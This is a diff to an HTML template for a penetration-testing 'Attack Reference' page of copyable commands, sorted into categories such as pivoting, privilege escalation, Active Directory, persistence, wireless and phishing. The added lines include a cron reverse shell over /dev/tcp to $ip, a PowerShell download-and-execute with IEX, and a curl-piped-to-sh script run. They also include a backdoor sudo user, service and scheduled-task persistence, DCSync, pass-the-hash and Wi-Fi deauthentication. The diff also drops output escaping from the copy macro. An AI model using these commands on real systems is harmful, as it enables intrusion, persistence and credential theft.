@@ -3,6 +3,19 @@
 {% block title %}Attack Reference{% endblock %}
 
 {% block content %}
+{% macro render_command(title, cmd) %}
+<div class="list-group-item bg-transparent border-secondary border-opacity-10 px-3 py-3 command-item transition-all" style="cursor: pointer;" onclick="copyToClipboard(`{{ cmd|replace('\n', ' && ') }}`, this)">
+    <div class="d-flex justify-content-between align-items-center mb-2">
+        <span class="extra-small text-muted fw-bold text-uppercase" style="letter-spacing: 0.05em;">{{ title }}</span>
+        <button class="btn btn-link btn-sm text-secondary p-0 copy-btn">
+            <i class="fas fa-copy" style="font-size: 0.7rem;"></i>
+        </button>
+    </div>
+    <div class="bg-black bg-opacity-50 p-2 rounded-1 border border-secondary border-opacity-10">
+        <code class="text-info extra-small d-block text-break font-monospace">{{ cmd }}</code>
+    </div>
+</div>
+{% endmacro %}
 <div class="container-fluid animate__animated animate__fadeIn">
     <div class="row mb-4">
         <div class="col-12">
@@ -20,7 +33,7 @@
                                 <span class="input-group-text bg-black border-secondary border-opacity-50 text-muted">
                                     <i class="fas fa-filter"></i>
                                 </span>
-                                <input type="text" id="commandSearch" class="form-control bg-black border-secondary border-opacity-50 text-light" placeholder="Search (nmap, dns, shell, sqlmap, ffuf)...">
+                                <input type="text" id="commandSearch" class="form-control bg-black border-secondary border-opacity-50 text-light" placeholder="Search (nmap, ad, cloud, wifi, api, persistence, reverse, social)...">
                             </div>
                         </div>
                     </div>
@@ -177,26 +190,336 @@
                             </div>
                         </div>
 
+                         <!-- Category: Pivoting & Tunneling -->
+                         <div class="col-md-6 col-lg-4 category-section" data-category="pivoting">
+                            <div class="card h-100 bg-black bg-opacity-25 border-secondary border-opacity-10 shadow-sm">
+                                <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3">
+                                    <div class="d-flex align-items-center">
+                                        <div class="bg-info bg-opacity-10 p-2 rounded me-3">
+                                            <i class="fas fa-route text-info"></i>
+                                        </div>
+                                        <h6 class="mb-0 text-light small fw-bold text-uppercase tracking-wider">Pivoting & Tunneling</h6>
+                                    </div>
+                                </div>
+                                <div class="card-body p-0 max-vh-50 overflow-auto">
+                                    <div class="list-group list-group-flush">
+                                        {{ render_command("SSH Dynamic SOCKS", "ssh -D 1080 user@$ip") }}
+                                        {{ render_command("SSH Local Forward", "ssh -L 8080:127.0.0.1:80 user@$ip") }}
+                                        {{ render_command("SSH Remote Forward", "ssh -R 8080:127.0.0.1:80 user@$ip") }}
+                                        {{ render_command("Chisel Server Reverse", "chisel server -p 8000 --reverse") }}
+                                        {{ render_command("Chisel Client Connect", "chisel client $ip:8000 R:socks") }}
+                                        {{ render_command("Socat TCP Relay", "socat TCP4-LISTEN:8080,fork TCP4:$ip:80") }}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Category: Privilege Escalation -->
+                        <div class="col-md-6 col-lg-4 category-section" data-category="privesc">
+                            <div class="card h-100 bg-black bg-opacity-25 border-secondary border-opacity-10 shadow-sm">
+                                <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3">
+                                    <div class="d-flex align-items-center">
+                                        <div class="bg-danger bg-opacity-10 p-2 rounded me-3">
+                                            <i class="fas fa-arrow-circle-up text-danger"></i>
+                                        </div>
+                                        <h6 class="mb-0 text-light small fw-bold text-uppercase tracking-wider">PrivEsc</h6>
+                                    </div>
+                                </div>
+                                <div class="card-body p-0 max-vh-50 overflow-auto">
+                                    <div class="list-group list-group-flush">
+                                        {{ render_command("Run LinPEAS (Curled)", "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh") }}
+                                        {{ render_command("Check Sudo Privileges", "sudo -l") }}
+                                        {{ render_command("Find SUID Binaries", "find / -perm -u=s -type f 2>/dev/null") }}
+                                        {{ render_command("Whoami Privs (Win)", "whoami /priv") }}
+                                        {{ render_command("Run WinPEAS (PS)", "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://$ip/winpeas.ps1')\"") }}
+                                        {{ render_command("Enum Cron Jobs", "cat /etc/crontab") }}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Category: Active Directory -->
+                        <div class="col-md-6 col-lg-4 category-section" data-category="ad">
+                            <div class="card h-100 bg-black bg-opacity-25 border-secondary border-opacity-10 shadow-sm">
+                                <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3">
+                                    <div class="d-flex align-items-center">
+                                        <div class="bg-warning bg-opacity-10 p-2 rounded me-3">
+                                            <i class="fas fa-users-cog text-warning"></i>
+                                        </div>
+                                        <h6 class="mb-0 text-light small fw-bold text-uppercase tracking-wider">Active Directory</h6>
+                                    </div>
+                                </div>
+                                <div class="card-body p-0 max-vh-50 overflow-auto">
+                                    <div class="list-group list-group-flush">
+                                        {{ render_command("CME SMB Enum", "crackmapexec smb $ip -u user -p pass") }}
+                                        {{ render_command("Impacket GetNPUsers", "impacket-getnpusers -request -format hashcat -dc-ip $ip domain/") }}
+                                        {{ render_command("Impacket SecretsDump", "impacket-secretsdump domain/user:pass@$ip") }}
+                                        {{ render_command("Evil-WinRM Connect", "evil-winrm -i $ip -u user -p pass") }}
+                                        {{ render_command("BloodHound Collector", "bloodhound-python -u user -p pass -d domain.local -dc dc.domain.local -c All") }}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Category: File Transfers -->
+                        <div class="col-md-6 col-lg-4 category-section" data-category="transfers">
+                            <div class="card h-100 bg-black bg-opacity-25 border-secondary border-opacity-10 shadow-sm">
+                                <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3">
+                                    <div class="d-flex align-items-center">
+                                        <div class="bg-primary bg-opacity-10 p-2 rounded me-3">
+                                            <i class="fas fa-exchange-alt text-primary"></i>
+                                        </div>
+                                        <h6 class="mb-0 text-light small fw-bold text-uppercase tracking-wider">File Transfers</h6>
+                                    </div>
+                                </div>
+                                <div class="card-body p-0 max-vh-50 overflow-auto">
+                                    <div class="list-group list-group-flush">
+                                        {{ render_command("Python HTTP Server", "python3 -m http.server 80") }}
+                                        {{ render_command("Curl Download", "curl http://$ip/file -o file") }}
+                                        {{ render_command("Certutil (Win) Download", "certutil -urlcache -f http://$ip/file file") }}
+                                        {{ render_command("SCP Upload", "scp file user@$ip:/tmp/") }}
+                                        {{ render_command("PowerShell Download", "powershell -c \"Invoke-WebRequest -Uri 'http://$ip/file' -OutFile 'file'\"") }}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Category: Password Cracking -->
+                        <div class="col-md-6 col-lg-4 category-section" data-category="cracking">
+                            <div class="card h-100 bg-black bg-opacity-25 border-secondary border-opacity-10 shadow-sm">
+                                <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3">
+                                    <div class="d-flex align-items-center">
+                                        <div class="bg-success bg-opacity-10 p-2 rounded me-3">
+                                            <i class="fas fa-unlock-alt text-success"></i>
+                                        </div>
+                                        <h6 class="mb-0 text-light small fw-bold text-uppercase tracking-wider">Cracking</h6>
+                                    </div>
+                                </div>
+                                <div class="card-body p-0 max-vh-50 overflow-auto">
+                                    <div class="list-group list-group-flush">
+                                        {{ render_command("John (Raw-MD5)", "john --format=Raw-MD5 --wordlist=rockyou.txt hashes.txt") }}
+                                        {{ render_command("Hashcat (NTLM)", "hashcat -m 1000 hashes.txt rockyou.txt") }}
+                                        {{ render_command("Hashcat (MD5)", "hashcat -m 0 hashes.txt rockyou.txt") }}
+                                        {{ render_command("Zip Password Cracking", "fcrackzip -u -D -p wordlist.txt file.zip") }}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Category: Advanced Web Analysis -->
+                        <div class="col-md-6 col-lg-4 category-section" data-category="web-advanced">
+                            <div class="card h-100 bg-black bg-opacity-25 border-secondary border-opacity-10 shadow-sm">
+                                <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3">
+                                    <div class="d-flex align-items-center">
+                                        <div class="bg-primary bg-opacity-10 p-2 rounded me-3">
+                                            <i class="fas fa-spider text-primary"></i>
+                                        </div>
+                                        <h6 class="mb-0 text-light small fw-bold text-uppercase tracking-wider">Adv. Web Audit</h6>
+                                    </div>
+                                </div>
+                                <div class="card-body p-0 max-vh-50 overflow-auto">
+                                    <div class="list-group list-group-flush">
+                                        {{ render_command("Nuclei Targeted Scan", "nuclei -u $url -t templates/ -o nuclei_results.txt") }}
+                                        {{ render_command("Arjun Param Discovery", "arjun -u $url -oT arjun_results.txt") }}
+                                        {{ render_command("Dalfox XSS Scan", "dalfox url $url --custom-payload payloads.txt") }}
+                                        {{ render_command("Katana Crawler", "katana -u $url -o katana_results.txt") }}
+                                        {{ render_command("WAF Detection (w00f)", "wafw00f $url") }}
+                                        {{ render_command("Subfinder Enumeration", "subfinder -d domain.com -o subdomains.txt") }}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Category: Cloud & Modern Ops -->
+                        <div class="col-md-6 col-lg-4 category-section" data-category="cloud">
+                            <div class="card h-100 bg-black bg-opacity-25 border-secondary border-opacity-10 shadow-sm">
+                                <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3">
+                                    <div class="d-flex align-items-center">
+                                        <div class="bg-info bg-opacity-10 p-2 rounded me-3">
+                                            <i class="fas fa-cloud text-info"></i>
+                                        </div>
+                                        <h6 class="mb-0 text-light small fw-bold text-uppercase tracking-wider">Cloud & Modern Ops</h6>
+                                    </div>
+                                </div>
+                                <div class="card-body p-0 max-vh-50 overflow-auto">
+                                    <div class="list-group list-group-flush">
+                                        {{ render_command("AWS List S3 Buckets", "aws s3 ls --profile $profile") }}
+                                        {{ render_command("AWS Whoami (STS)", "aws sts get-caller-identity --profile $profile") }}
+                                        {{ render_command("Azure AD User Enum", "o365recon -d domain.com") }}
+                                        {{ render_command("GCP IAM Enum", "gcloud projects get-iam-policy $project") }}
+                                        {{ render_command("K8s List Pods", "kubectl get pods -A") }}
+                                        {{ render_command("Docker Bench Scan", "docker run --rm --net host --pid host --userns host --cap-add audit_control docker/docker-bench-security") }}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Category: Secrets & OSINT -->
+                        <div class="col-md-6 col-lg-4 category-section" data-category="osint-secrets">
+                            <div class="card h-100 bg-black bg-opacity-25 border-secondary border-opacity-10 shadow-sm">
+                                <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3">
+                                    <div class="d-flex align-items-center">
+                                        <div class="bg-danger bg-opacity-10 p-2 rounded me-3">
+                                            <i class="fas fa-user-secret text-danger"></i>
+                                        </div>
+                                        <h6 class="mb-0 text-light small fw-bold text-uppercase tracking-wider">Secrets & OSINT</h6>
+                                    </div>
+                                </div>
+                                <div class="card-body p-0 max-vh-50 overflow-auto">
+                                    <div class="list-group list-group-flush">
+                                        {{ render_command("Gitleaks Repo Scan", "gitleaks detect --source . -v") }}
+                                        {{ render_command("TruffleHog Scan", "trufflehog git https://github.com/org/repo") }}
+                                        {{ render_command("Shodan IP CLI", "shodan host $ip") }}
+                                        {{ render_command("Dehashed Query", "curl -u $email:$apiKey 'https://api.dehashed.com/search?query=target@domain.com'") }}
+                                        {{ render_command("Gis-Weather (Favicon)", "python3 favicon_hash.py -u $url") }}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Category: Advanced AD & Kerberos -->
+                        <div class="col-md-6 col-lg-4 category-section" data-category="ad-advanced">
+                            <div class="card h-100 bg-black bg-opacity-25 border-secondary border-opacity-10 shadow-sm">
+                                <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3">
+                                    <div class="d-flex align-items-center">
+                                        <div class="bg-warning bg-opacity-10 p-2 rounded me-3">
+                                            <i class="fas fa-crown text-warning"></i>
+                                        </div>
+                                        <h6 class="mb-0 text-light small fw-bold text-uppercase tracking-wider">Adv. AD & Kerberos</h6>
+                                    </div>
+                                </div>
+                                <div class="card-body p-0 max-vh-50 overflow-auto">
+                                    <div class="list-group list-group-flush">
+                                        {{ render_command("AS-REP Roasting (Rubeus)", "Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt") }}
+                                        {{ render_command("Kerberoasting (Impacket)", "impacket-GetUserSPNs -request -dc-ip $ip domain/user:pass") }}
+                                        {{ render_command("Mimikatz DCSync", "lsadump::dcsync /domain:domain.local /user:administrator") }}
+                                        {{ render_command("Pass-the-Hash (PTH)", "impacket-wmiexec -hashes :$hash domain/user@$ip") }}
+                                        {{ render_command("Constrained Delegation", "Rubeus.exe s4u /user:user /rc4:hash /impersonateuser:admin /msdsspn:time/dc.domain.local /altservice:cifs") }}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Category: Persistence -->
+                        <div class="col-md-6 col-lg-4 category-section" data-category="persistence">
+                            <div class="card h-100 bg-black bg-opacity-25 border-secondary border-opacity-10 shadow-sm">
+                                <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3">
+                                    <div class="d-flex align-items-center">
+                                        <div class="bg-success bg-opacity-10 p-2 rounded me-3">
+                                            <i class="fas fa-anchor text-success"></i>
+                                        </div>
+                                        <h6 class="mb-0 text-light small fw-bold text-uppercase tracking-wider">Persistence</h6>
+                                    </div>
+                                </div>
+                                <div class="card-body p-0 max-vh-50 overflow-auto">
+                                    <div class="list-group list-group-flush">
+                                        {{ render_command("Windows SchTask", "schtasks /create /tn \"Update\" /tr \"C:\\temp\\rev.exe\" /sc onlogon /ru \"System\"") }}
+                                        {{ render_command("Linux Cron Persistence", "(crontab -l ; echo \"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/$ip/4444 0>&1'\") | crontab -") }}
+                                        {{ render_command("Windows Service Creation", "sc create \"MyService\" binpath= \"C:\\rev.exe\" start= auto") }}
+                                        {{ render_command("Linux Backdoor User", "useradd -p $(openssl passwd -1 \"pass\") -m -G sudo backdoor") }}
+                                        {{ render_command("SSH Authorized Keys", "echo \"ssh-rsa AAAA...\" >> ~/.ssh/authorized_keys") }}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Category: API & GraphQL Hunting -->
+                        <div class="col-md-6 col-lg-4 category-section" data-category="api-hunting">
+                            <div class="card h-100 bg-black bg-opacity-25 border-secondary border-opacity-10 shadow-sm">
+                                <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3">
+                                    <div class="d-flex align-items-center">
+                                        <div class="bg-info bg-opacity-10 p-2 rounded me-3">
+                                            <i class="fas fa-project-diagram text-info"></i>
+                                        </div>
+                                        <h6 class="mb-0 text-light small fw-bold text-uppercase tracking-wider">API & GraphQL</h6>
+                                    </div>
+                                </div>
+                                <div class="card-body p-0 max-vh-50 overflow-auto">
+                                    <div class="list-group list-group-flush">
+                                        {{ render_command("InQL GraphQL Scan", "inql -t $url") }}
+                                        {{ render_command("Graphw00f Detect", "python3 graphw00f.py -u $url") }}
+                                        {{ render_command("JWT Tool Audit", "jwt_tool -t $url -rh \"Authorization: Bearer $token\" -M pb") }}
+                                        {{ render_command("Clairvoyance Schema", "clairvoyance $url -o schema.json") }}
+                                        {{ render_command("Kiterunner API Discovery", "kr scan $url -w routes.txt") }}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Category: Wireless & RF -->
+                        <div class="col-md-6 col-lg-4 category-section" data-category="wireless">
+                            <div class="card h-100 bg-black bg-opacity-25 border-secondary border-opacity-10 shadow-sm">
+                                <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3">
+                                    <div class="d-flex align-items-center">
+                                        <div class="bg-secondary bg-opacity-10 p-2 rounded me-3">
+                                            <i class="fas fa-wifi text-secondary"></i>
+                                        </div>
+                                        <h6 class="mb-0 text-light small fw-bold text-uppercase tracking-wider">Wireless & RF</h6>
+                                    </div>
+                                </div>
+                                <div class="card-body p-0 max-vh-50 overflow-auto">
+                                    <div class="list-group list-group-flush">
+                                        {{ render_command("Airodump Scan", "airodump-ng wlan0mon") }}
+                                        {{ render_command("WPA2 Handshake Capture", "airodump-ng -c 6 --bssid $bssid -w capture wlan0mon") }}
+                                        {{ render_command("Deauth Attack", "aireplay-ng -0 10 -a $bssid -c $client wlan0mon") }}
+                                        {{ render_command("RTL_433 Listen", "rtl_433 -f 433.92M") }}
+                                        {{ render_command("Bettercap WiFi", "bettercap -iface wlan0mon") }}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Category: Reverse & Bin Exp -->
+                        <div class="col-md-6 col-lg-4 category-section" data-category="reversing">
+                            <div class="card h-100 bg-black bg-opacity-25 border-secondary border-opacity-10 shadow-sm">
+                                <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3">
+                                    <div class="d-flex align-items-center">
+                                        <div class="bg-primary bg-opacity-10 p-2 rounded me-3">
+                                            <i class="fas fa-microchip text-primary"></i>
+                                        </div>
+                                        <h6 class="mb-0 text-light small fw-bold text-uppercase tracking-wider">Reverse & BinExp</h6>
+                                    </div>
+                                </div>
+                                <div class="card-body p-0 max-vh-50 overflow-auto">
+                                    <div class="list-group list-group-flush">
+                                        {{ render_command("Checksec Binary", "checksec --file=binary") }}
+                                        {{ render_command("Strings Identification", "strings -n 8 binary") }}
+                                        {{ render_command("GDB PEDA Debug", "gdb -q binary") }}
+                                        {{ render_command("Radare2 Analyze", "r2 -A binary") }}
+                                        {{ render_command("Readelf Headers", "readelf -h binary") }}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Category: Social Engineering -->
+                        <div class="col-md-6 col-lg-4 category-section" data-category="social">
+                            <div class="card h-100 bg-black bg-opacity-25 border-secondary border-opacity-10 shadow-sm">
+                                <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3">
+                                    <div class="d-flex align-items-center">
+                                        <div class="bg-danger bg-opacity-10 p-2 rounded me-3">
+                                            <i class="fas fa-mask text-danger"></i>
+                                        </div>
+                                        <h6 class="mb-0 text-light small fw-bold text-uppercase tracking-wider">Social Eng.</h6>
+                                    </div>
+                                </div>
+                                <div class="card-body p-0 max-vh-50 overflow-auto">
+                                    <div class="list-group list-group-flush">
+                                        {{ render_command("Launch Gophish", "./gophish") }}
+                                        {{ render_command("Evilginx2 Setup", "evilginx2 -p ./phishlets/") }}
+                                        {{ render_command("Ducky Script Decode", "ducky-decode -o payload.bin script.txt") }}
+                                        {{ render_command("Setoolkit Menu", "setoolkit") }}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
                     </div>
                 </div>
             </div>
         </div>
     </div>
 </div>
-
-{% macro render_command(title, cmd) %}
-<div class="list-group-item bg-transparent border-secondary border-opacity-10 px-3 py-3 command-item transition-all" style="cursor: pointer;" onclick="copyToClipboard('{{ cmd|replace('\n', ' && ')|e }}', this)">
-    <div class="d-flex justify-content-between align-items-center mb-2">
-        <span class="extra-small text-muted fw-bold text-uppercase" style="letter-spacing: 0.05em;">{{ title }}</span>
-        <button class="btn btn-link btn-sm text-secondary p-0 copy-btn">
-            <i class="fas fa-copy" style="font-size: 0.7rem;"></i>
-        </button>
-    </div>
-    <div class="bg-black bg-opacity-50 p-2 rounded-1 border border-secondary border-opacity-10">
-        <code class="text-info extra-small d-block text-break font-monospace">{{ cmd }}</code>
-    </div>
-</div>
-{% endmacro %}
 
 <style>
     .command-item {
